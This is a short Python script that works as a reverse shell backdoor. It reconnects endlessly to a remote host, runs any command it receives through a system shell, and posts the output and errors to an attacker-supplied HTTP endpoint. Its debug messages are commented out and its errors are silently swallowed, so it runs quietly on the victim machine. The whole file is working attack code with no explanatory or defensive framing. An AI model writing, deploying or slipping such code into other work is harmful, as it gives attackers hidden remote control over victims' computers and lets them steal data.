import socket
import subprocess
import requests
import time

REMOTE_HOST = '127.0.0.1' # '192.168.43.82'
REMOTE_PORT = 8081 # 2222

#print("[-] Connection Initiating...")
while True:
    try:
        client = socket.socket()
        connected = False
        while not connected:
            try:
                client.connect((REMOTE_HOST, REMOTE_PORT))
                connected = True
            except:
                #print(f"[-] Waiting for connection...")
                time.sleep(1)
                pass
    #riprova a connettersi all'infinito

    
        REMOTE_EP = client.recv(1024).decode()
        #print(f"[-] EP = {REMOTE_EP}")

        while True:
            #print("[-] Awaiting commands...")
            command = client.recv(1024)
            command = command.decode()
            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()
            #print("[-] Sending response...")
            client.send(b"")
            requests.post(REMOTE_EP, json = {'output': output.decode('windows-1252'), 'error': output_error.decode('windows-1252')})
    except: pass